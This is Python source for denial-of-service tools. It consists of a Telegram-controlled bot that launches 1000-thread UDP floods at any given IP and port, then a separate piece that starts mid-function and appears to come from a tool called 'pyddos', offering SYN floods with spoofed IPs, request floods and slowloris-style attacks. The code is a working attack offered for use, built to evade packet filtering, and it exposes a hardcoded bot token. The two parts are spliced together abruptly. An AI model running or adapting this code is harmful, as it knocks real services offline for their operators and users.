import telebot
import socket
import random
import time
import re
import threading
from random import choice, randint

# --- Configuration ---
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185
FILE_NAME = "ua.txt"
MAX_THREADS = 1000 # High threads for L4 flood

bot = telebot.TeleBot(BOT_TOKEN)

def add_useragent():
    """Reads and cleans User-Agents from your ua.txt file."""
    try:
        with open(f"./{FILE_NAME}", "r", encoding='utf-8') as fp:
            # Using your regex logic to find all UAs
            uagents = re.findall(r"(.+)\n", fp.read())
            if not uagents:
                return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
            return uagents
    except FileNotFoundError:
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

def generate_l4_payload(target_ip, uagents):
    """
    Creates a Layer 4 UDP payload. 
    Even though it's UDP, we include HTTP headers to bypass 
    simple packet inspection filters.
    """
    # Randomized path and query to prevent caching
    random_path = f"/{randint(1, 9999999)}?q={randint(1, 999999)}"
    
    payload = (
        f"GET {random_path} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: {choice(uagents)}\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Length: {randint(10, 100)}\r\n\r\n"
        f"{random._urandom(32).hex()}" # Adds random junk data at the end
    ).encode('utf-8')
    return payload

def run_udp_l4_flood(target_ip, target_port, duration, uagents):
    """The High-Speed UDP L4 Flood Loop"""
    # SOCK_DGRAM = UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Pre-generate a set of payloads to save CPU time during the flood
    payload_pool = [generate_l4_payload(target_ip, uagents) for _ in range(50)]
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Pick a pre-made payload and blast it
            pkt = choice(payload_pool)
            sock.sendto(pkt, (target_ip, target_port))
        except Exception:
            # If the socket breaks or network is choked, just keep going
            continue
            
    sock.close()

@bot.message_handler(commands=['attack'])
def attack_command(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        # Command: /attack <ip> <port> <time>
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ **Usage:** `/attack <ip> <port> <time>`")
            return

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        uagents = add_useragent()
        
        bot.reply_to(message, 
            f"🚀 **L4 UDP FLOOD INITIATED**\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"🕒 **Duration:** `{duration}s`\n"
            f"🧵 **Threads:** `{MAX_THREADS}`\n"
            f"📑 **UA Pool:** `{len(uagents)}` loaded.")

        # Launch the threads
        for _ in range(MAX_THREADS):
            t = threading.Thread(
                target=run_udp_l4_flood, 
                args=(target_ip, target_port, duration, uagents)
            )
            t.daemon = True
            t.start()

    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

if __name__ == "__main__":
    print("UDP L4 Bot is listening...")
    bot.infinity_polling()
_flags, window, tcp_checksum,
						  urg_prt)
		packet = ip_header + tcp_header

		return packet

	def run(self):
		global sent_syn_packets
		packet = self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet, (self.tgt, 0))
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user', 'red'))
		except Exception as e:
			cprint(e, 'red')
		finally:
			with self.lock:
				sent_syn_packets += 1
			self.lock.release()


def main():
	parser = ArgumentParser(
		usage='./%(prog)s -t [target] -p [port] -t [number threads]',
		formatter_class=RawTextHelpFormatter,
		prog='pyddos',
		description=cprint(title, 'white', attrs=['bold']),
		epilog='''
Example:
    ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
    ./%(prog)s -d www.domain.com -s 100 -Request
    ./%(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
'''
	)
	options = parser.add_argument_group('options', '')
	options.add_argument('-d', metavar='<ip|domain>', default=False,
						 help='Specify your target such an ip or domain name')
	options.add_argument('-t', metavar='<float>', default=5.0, help='Set timeout for socket')
	options.add_argument('-T', metavar='<int>', default=1000, help='Set threads number for connection (default = 1000)')
	options.add_argument('-p', metavar='<int>', default=80,
						 help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|',
																			 'red'))
	options.add_argument('-s', metavar='<int>', default=100, help='Set sleep time for reconnection')
	options.add_argument('-i', metavar='<ip address>', default=False, help='Specify spoofed ip unless use fake ip')
	options.add_argument('-Request', action='store_true', help='Enable request target')
	options.add_argument('-Synflood', action='store_true', help='Enable synflood attack')
	options.add_argument('-Pyslow', action='store_true', help='Enable pyslow attack')
	options.add_argument('--fakeip', action='store_true', default=False,
						 help='Option to create fake ip if not specify spoofed ip')
	args = parser.parse_args()
	if args.d == False:
		parser.print_help()
		sys.exit()
	add_bots();
	add_useragent()
	if args.d:
		check_tgt(args)
	if args.Synflood:
		uid = os.getpid()
		if uid == 0:
			cprint('[*] You have enough permisson to run this script', 'green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[-] You haven\'t enough permission to run this script', 'red'))
		tgt = check_tgt(args)
		synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
		ts = []
		threads = []
		print(colored('[*] Started SYN Flood: ', 'blue') + colored(tgt, 'red'))
		while 1:
			if args.i == False:
				args.fakeip = True
				if args.fakeip == True:
					ip = fake_ip()
			else:
				ip = args.i
			try:
				for x in range(0, int(args.T)):
					thread = Synflood(tgt, ip, sock=synsock)
					thread.setDaemon(True)
					thread.start()
					thread.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user', 'red'))
	elif args.Request:
		tgt = args.d
		threads = []
		print(colored('[*] Start send request to: ', 'blue') + colored(tgt, 'red'))
		while 1:
			try:
				for x in range(int(args.T)):
					t = Requester(tgt)
					t.daemon = True
					t.start()
					t.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user', 'red'))
	elif args.Pyslow:
		try:
			tgt = args.d
			port = args.p
			to = float(args.t)
			st = int(args.s)
			threads = int(args.T)
		except Exception as e:
			print('[-]', e)
		while 1:
			try:
				worker = Pyslow(tgt, port, to, threads, st)
				worker.doconnection()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user', 'red'))
	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
		parser.print_help()
		print
		sys.exit(cprint('[-] You must choose attack type', 'red'))


if __name__ == '__main__':
	main()
